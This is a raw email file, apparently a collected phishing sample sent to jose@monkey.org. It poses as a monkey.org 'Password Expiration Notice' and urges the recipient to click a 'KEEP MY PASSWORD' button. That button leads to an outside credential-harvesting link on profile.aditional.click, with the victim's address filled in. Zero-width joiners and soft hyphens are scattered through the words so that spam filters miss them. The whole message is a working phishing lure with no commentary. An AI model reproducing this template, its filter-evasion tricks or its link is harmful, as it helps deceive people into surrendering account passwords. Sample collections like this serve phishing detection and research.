@@ -1,0 +1,213 @@
+Return-Path: inquiry@primemoverae.com
+Delivered-To: jose@monkey.org
+X-FDA: 82726829514.04.1F47E09
+Received: from mailp.primemoverae.com (mailp.primemoverae.com [88.218.79.238])
+	by imf13.b.hostedemail.com (Postfix) with ESMTP id E501A120004
+	for <jose@monkey.org>; Tue, 29 Oct 2024 14:12:13 +0000 (UTC)
+Authentication-Results: imf13.b.hostedemail.com;	dkim=pass
+ header.d=primemoverae.com header.s=dkim header.b=Ton0qWTH;	spf=pass
+ (imf13.b.hostedemail.com: domain of inquiry@primemoverae.com designates
+ 88.218.79.238 as permitted sender) smtp.mailfrom=inquiry@primemoverae.com;
+	dmarc=pass (policy=none) header.from=primemoverae.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1730210989;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=NuYUt45YacoCgRoDbIinVfOG9eE4MLX0maiTKwkPxWQ=;
+	b=wzKMhGevuhsc3R0bjaVwYN7VJKofl66Fz9KHtPUkRSWRoeddRxhoeh/Bn9pzISWH1aTCmw
+	S7n1e+L+7Guwb3Gptm9oSkx6+Ic7oHtvpCtWlkmBIYAY1ZeCvnUTXZqPjw+1BeMOzF7Fa/
+	1t9W++HUKPJoAgWHKK1ZfB2IRjcx0cs=
+ARC-Authentication-Results: i=1;	imf13.b.hostedemail.com;	dkim=pass
+ header.d=primemoverae.com header.s=dkim header.b=Ton0qWTH;	spf=pass
+ (imf13.b.hostedemail.com: domain of inquiry@primemoverae.com designates
+ 88.218.79.238 as permitted sender) smtp.mailfrom=inquiry@primemoverae.com;
+	dmarc=pass (policy=none) header.from=primemoverae.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1730210989; a=rsa-sha256;
+	cv=none;
+	b=4j00HajhE9ynoSgAPr/F0V3xpba9SiuBirgZVb228aKzPXs/WlEd6LdHq+TGQkyBGbRhEX
+	/P466mCDsC2ds/fB6PCLAbItjT0Kq08SmLbjHxeGqanh7PXKyRcP8fCP2JSicWzBxx0uwJ
+	1PDP/ZzH3spEfBNXDmiKDqF5B+WbaAo=
+Received: from [127.0.0.1] (localhost [127.0.0.1]) by localhost (Mailerdaemon)
+ with ESMTPSA id A8EC36426C	for <jose@monkey.org>; Tue, 29 Oct 2024 14:12:29
+ +0000 (GMT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=primemoverae.com;
+	s=dkim; t=1730211150;
+ h=from:subject:date:message-id:to:mime-version:content-type;
+	bh=NuYUt45YacoCgRoDbIinVfOG9eE4MLX0maiTKwkPxWQ=;
+	b=Ton0qWTHYAoOii4/WLIo6jabaFxEjBRGVG23Y/yp2Ar90hM9f0SOXb48/ft4Cs11JcbMVU
+	LVkllCZc4keS2ZtS2P/pzN9uYwyFihDPCutnb+JNqgedssbopCraqXr0aSYvT3I/BYvNHy
+	18tkT6Fxl8Yht6wzeoXz//U/KLihZ8JVk3nJ1RJ1+nNAWCW8DaiMsg0u3wvyR0zrsgTpKj
+	AVafXK97pYzFipBwWqycKfuDLuw12BN+wnFLp8ADa2qKpp8Hv6xGYEtnMilVK02mUAm1tx
+	uogiOO0HQofnTyjz5n2U2wyrkt97vfcSAIeAdSddIaXbNIv88MI6wMcxMHRIyw==
+From: monkey.org<inquiry@primemoverae.com>
+To: jose@monkey.org
+Subject: =?UTF-8?B?UOKAjWFzc+KAjXdvcmQgRXhwaXLigI1hdGlvbiBOb3TigI1pY2U=?=
+Date: 29 Oct 2024 15:12:29 +0100
+Message-ID: <20241029151227.DC77ADDB2C163C5A@primemoverae.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_B1AEFC63.0D3702DC"
+X-Last-TLS-Session-Version: TLSv1.3
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: E501A120004
+X-Stat-Signature: krhn6ir1wkdkikc7nm3itg9dek13bqew
+X-Spam-Status: No, score=5.42
+X-Rspam-User: 
+X-HE-Tag: 1730211133-223309
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/TPneexcSsYhFLvColQCQE6NLAENikxVJM5kX/TA9bedc?=
+ =?utf-8?q?kNTE7fJ4Q5j9schVdp+RjQcctxPFkB0CRvMA6yfF9S7L70fEKmzdkFimzl43jw82T?=
+ =?utf-8?q?olOd3UUEaiSUgMwUgWkyYQ+GIqVhFi3wnxn8rkQWLYYLe06PPcgkhZ95Hs+3tU4N/?=
+ =?utf-8?q?mMBDygkWmI+w54QqxtIy6Vr1lTO0VIsTHTCB94dYpBMJAHOk00xDVe/ytiizgd2ml?=
+ =?utf-8?q?KnhOqXSJAqTMjYvd4TB3FeAKVPVHX2ReA6e+BvtDsqQllzF+Ou4j1JSfagmEsXzfn?=
+ =?utf-8?q?mQ/2sBoRRfQVGBumEKAc5Et+mjSD5CNjZjMR5Xml9vYXavapGSlLAGv49/P8wGEUe?=
+ =?utf-8?q?zjCM3ymVngKvoo7vYCR55Lo8AWLSdWv8HXCpV2Fuipu7TDWZp98azBhRH+ms0+/At?=
+ =?utf-8?q?H7d2I8dr7ywdayIM+FDBzHa5AUlpvfi6IDCyZHG5VAaqhF16YZ54t8uYN1JJdZLGp?=
+ =?utf-8?q?ZJ45FuvaO+dCiRrodFSgEPzY2ydxL13uvFGW2+YmHz7aGj7N/82uuvNf9VC4WQWIZ?=
+ =?utf-8?q?FymHVzkvJPd4cg+u6tsv/Z9UHiNx8IQ+T6ANY6dbi4AD0v7CWlHDDHz2MFao/S2wP?=
+ =?utf-8?q?DexNK46i/idYZBievxL6Cj9h5LBguN1FiYdpz5/4OO6gEPYNIq2GVv6Ajo/MCo7m3?=
+ =?utf-8?q?g87iHhlHfr6BzbybtWPYQgtKslypjZOx29Nm2U7ANO/s8tCrn8v2EU1sUaCkN37QI?=
+ =?utf-8?q?KsSL2rQQBZwFbmnx+XHWg6mw01QnFzldkLdjQJWBaY2NPsu8j/pGgEfA69qiLKj8K?=
+ =?utf-8?q?/SzdH3qukGr3HobIEldplzbXyP6xpfmTVyt+owLC9mnLxNAC5DsSsrGtsY4t4vRuO?=
+ =?utf-8?q?uaffyZIKcqsGckiTz5Yr0A+9YRSNDXpSju7yf35Ev0tbGctMKrArNUE3F1SA/s0BN?=
+ =?utf-8?q?LQ/hIR68QutQHyV6IAmMPA_o58EVBDDfpWn0q3haCHwm8lJ8jBpXQkKWJZfxeOwzx?=
+ =?utf-8?q?5YoUXF1Vnbpk2GeguvV8NJU7U421mrMCiYnrdtMB3F9uiibAStoRS4cXjd2wLB1Rz?=
+ =?utf-8?q?u06NmUfCpFmyPXw5P5wkH6dfjJryoYiW2LRv+LiLdhSrXHgQBJuaOIzkwePbN23RO?=
+ =?utf-8?q?dQ4y1tTrYYgG3cLyZa6nrEyGebfH8PfnzZsm8q1SUHyEmXbgVOE2WIul9k89EG05j?=
+ =?utf-8?q?2sCtl0Cf9aVdZYYxzAaVW1XMI8Xvf9fVH6z/6R2VRvrS6MPGQy/owJMtgV951hPTh?=
+ =?utf-8?q?gdZ8ar6TE5PR56IzNmEiWS/+uKvdk1uQnJlU+E5fTAr/nDTzmRu1/TzwtOhwpcLJl?=
+ =?utf-8?q?ZaJmk89UFypRT9EjrF5NK67a+SglYKTOh2tvwf74Gy6o776u9dRhBAgUqJjDtM2Wg?=
+ =?utf-8?q?XZTNinX4IKx1ilwNSaIMBQxFBXibuev1H/x7FbQ7yVlAaQ2/cusIvBkjiHpYOWgIT?=
+ =?utf-8?q?viJiwLQHHYvXVlJuIhWGdTF0XS0FLvoeNERE535rcM3dWlk0bhbN5WdYXzUkWB3bY?=
+ =?utf-8?q?EaqIL2RZtQgzb6d2mVxO4AQZfnTL4TT8gR3iM4h4daA7YEz1H/N938ERq2F1CIu1W?=
+ =?utf-8?q?MaXDoAFXug8j1VYLDAgfZI2VOGI32KYvjAl5RAEBNb3u4ieRgYMusxjlrzqf/J8gG?=
+ =?utf-8?q?gXja3WvQoJGhPxW5M?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 317
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_B1AEFC63.0D3702DC
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><div dir=3D"ltr"><div dir=3D"ltr">
+
+<p style=3D'margin: 0px 0px 1em; color: rgb(0, 0, 0); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: -apple-system,Blink=
+MacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"Apple Color Emo=
+ji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 13px; font-style: normal=
+; font-weight: 400; word-spacing: 0px; white-space: normal; font-variant-li=
+gatures: normal; font-variant-caps: normal; text-decoration-style: initial;=
+ text-decoration-color: initial;'>&nbsp;</p>
+<table style=3D'border: 1px dotted rgb(211, 211, 211); color: rgb(51, 51, 5=
+1); text-transform: none; line-height: normal; text-indent: 0px; letter-spa=
+cing: normal; font-family: Verdana; font-size: 13px; font-style: normal; fo=
+nt-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: co=
+llapse; font-feature-settings: "liga" 0; background-color: rgb(255, 255, 25=
+5); font-variant-ligatures: normal; font-variant-caps: normal; text-decorat=
+ion-style: initial; text-decoration-color:=20
+initial;'><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing:=
+ border-box;"><td style=3D"padding: 25px 0px 0px; border: 1px dotted rgb(21=
+1, 211, 211); box-sizing: border-box;"><p style=3D'margin: 0px 0px 1em; fon=
+t-family: -apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Aria=
+l,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; box-si=
+zing: border-box;'><br>&nbsp;</p>
+<p style=3D'margin: 0px 0px 1em; color: rgb(58, 58, 58); font-family: -appl=
+e-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"A=
+pple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; box-sizing: border-bo=
+x;'><span style=3D'color: rgb(38, 112, 236); font-family: "segoe ui light";=
+ font-size: 34px; box-sizing: border-box;'>P&#8205;ass&#8205;word Expir&#82=
+05;action Not&#8205;ice</span></p>
+<p style=3D'margin: 0px 0px 1em; color: rgb(58, 58, 58); font-family: -appl=
+e-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"A=
+pple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 16px; box-=
+sizing: border-box;'><font face=3D"Calibri">Dear&nbsp;</font>
+<span style=3D"color: rgb(36, 36, 36); text-transform: none; text-indent: 0=
+px; font-size: 15px; font-style: normal; font-weight: 400; word-spacing: 0p=
+x; float: none; display: inline; white-space: normal; background-color: rgb=
+(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal;=
+ text-decoration-style: initial; text-decoration-color: initial;">jose</spa=
+n><font face=3D"Calibri">,</font></p>
+<p style=3D'margin: 0px 0px 1em; color: rgb(58, 58, 58); font-family: -appl=
+e-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"A=
+pple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 16px; box-=
+sizing: border-box;'><font face=3D"Calibri">Your password is set to expire =
+on&nbsp;</font>
+10/29/2024 3:12:27 p.m.<font face=3D"Calibri">.</font></p><p style=3D'margi=
+n: 0px 0px 1em; font-family: -apple-system,BlinkMacSystemFont,"Helvetica Ne=
+ue","Segoe UI",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe=
+ UI Symbol"; box-sizing: border-box;'><font face=3D"Calibri" style=3D"color=
+: rgb(58, 58, 58); font-size: 15px; box-sizing: border-box;">&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&#10687;jose@monkey.org </font></p>
+<p style=3D'margin: 0px 0px 1em; color: rgb(58, 58, 58); font-family: -appl=
+e-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"A=
+pple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 15px; box-=
+sizing: border-box;'><font face=3D"Calibri" style=3D"box-sizing: border-box=
+;">W&shy;e&shy;
+ e&shy;n&shy;c&shy;o&shy;u&shy;r&shy;a&shy;g&shy;e&shy; &shy;y&shy;o&shy;u&=
+shy; &shy;t&shy;o&shy; &shy;t&shy;a&shy;k&shy;e&shy; &shy;t&shy;h&shy;e&shy=
+; &shy;t&shy;i&shy;m&shy;e&shy; &shy;n&shy;o&shy;w&shy;=20
+&shy;t&shy;o&shy; &shy;m&shy;a&shy;i&shy;n&shy;t&shy;a&shy;i&shy;n&shy; &sh=
+y;y&shy;o&shy;u&shy;r&shy; &shy;p&shy;a&shy;s&shy;s&shy;w&shy;o&shy;r&shy;d=
+&shy; &shy;a&shy;c&shy;t&shy;i&shy;v&shy;i&shy;t&shy;y&shy;=20
+&shy;t&shy;o&shy; &shy;a&shy;v&shy;o&shy;i&shy;d&shy; i&shy;n&shy;t&shy;e&s=
+hy;r&shy;r&shy;u&shy;ption&shy;.&shy;</font></p><p style=3D"margin: 0px 0px=
+ 15px; color: rgb(116, 116, 135); font-family: Calibri; font-size: 15px; bo=
+x-sizing: border-box;">
+<a style=3D"background: rgb(27, 140, 250); margin: 4px; padding: 12px; colo=
+r: rgb(255, 255, 255); font-size: 14px; text-decoration: none; float: left;=
+ display: block; box-sizing: border-box;" href=3D"https://profile.aditional=
+=2Eclick/conservation.html?pop=3Djose@monkey.org" target=3D"_blank" rel=3D"=
+noopener"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://profile.adit=
+ional.click/conservation.html?pop%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&=
+amp;ust=3D1729553661257000&amp;usg=3DAOvVaw1aKqmHsmrgOWprnqZYX8xa"><span st=
+yle=3D"font-weight: bolder; box-sizing: border-box;">KE&shy;EP M&shy;Y PAS&=
+shy;SWO&shy;R&shy;D</span></a></p>
+<table style=3D'margin: 0px auto; border: 1px dotted rgb(211, 211, 211); co=
+lor: rgb(58, 58, 58); line-height: normal; font-family: Calibri; font-size:=
+ 15px; font-weight: 400; border-collapse: collapse; border-spacing: 0px; fo=
+nt-feature-settings: "liga" 0;' bgcolor=3D"#da4424"><tbody style=3D"box-siz=
+ing: border-box;"><tr style=3D"box-sizing: border-box;"></tr></tbody></tabl=
+e></td></tr><tr style=3D"box-sizing: border-box;">
+<td style=3D"padding: 25px 0px 0px; border: 1px dotted rgb(211, 211, 211); =
+color: rgb(58, 58, 58); font-size: 11px; box-sizing: border-box;"><p style=
+=3D"margin: 0px 0px 1em; font-family: Calibri; box-sizing: border-box;">&nb=
+sp;</p><p style=3D'margin: 0px 0px 1em; font-family: -apple-system,BlinkMac=
+SystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"Apple Color Emoji"=
+,"Segoe UI Emoji","Segoe UI Symbol"; box-sizing: border-box;'><font face=3D=
+"Calibri" style=3D"box-sizing: border-box;">
+N&shy;o&shy;t&shy;e&shy;:&shy; &shy;monkey.org</font><font face=3D"Calibri"=
+ style=3D"box-sizing: border-box;"><span><span>&nbsp;</span></span>&nbsp;&n=
+bsp; &shy;w&shy;i&shy;l&shy;l&shy; &shy;n&shy;o&shy;t&shy; &shy;b&shy;e&shy=
+; &shy;h&shy;e&shy;l&shy;d&shy; &shy;r&shy;e&shy;s&shy;p&shy;o&shy;n&shy;s&=
+shy;i&shy;b&shy;l&shy;e&shy; &shy;f&shy;&shy;o&shy;r&shy; &shy;a&shy;n&shy;=
+y&shy; &shy;a&shy;c&shy;c&shy;o&shy;u&shy;n&shy;t&shy; &shy;l&shy;o&shy;s&s=
+hy;s&shy;</font></p>
+<p style=3D'margin: 0px 0px 1em; font-family: -apple-system,BlinkMacSystemF=
+ont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"Apple Color Emoji","Segoe=
+ UI Emoji","Segoe UI Symbol"; box-sizing: border-box;'><font face=3D"Calibr=
+i" style=3D"box-sizing: border-box;">T&shy;h&shy;a&shy;n&shy;k&shy; &shy;y&=
+shy;o&shy;u&shy;.</font></p>
+<p style=3D'margin: 0px 0px 1em; font-family: -apple-system,BlinkMacSystemF=
+ont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"Apple Color Emoji","Segoe=
+ UI Emoji","Segoe UI Symbol"; box-sizing: border-box;'><font face=3D"Calibr=
+i" style=3D"box-sizing: border-box;">Copyright &copy; monkey.org 2&shy;0&sh=
+y;2&shy;4&nbsp;. &shy;A&shy;l&shy;l&shy; &shy;R&shy;i&shy;g&shy;h&shy;t&shy=
+;s&shy; &shy;R&shy;e&shy;s&shy;e&shy;r&shy;v&shy;e&shy;d&shy;.</font></p></=
+td></tr></tbody></table>
+
+</div>
+</div>
+</body></html>
+------=_NextPart_000_0012_B1AEFC63.0D3702DC
+
+------=_NextPart_000_0012_B1AEFC63.0D3702DC--
+
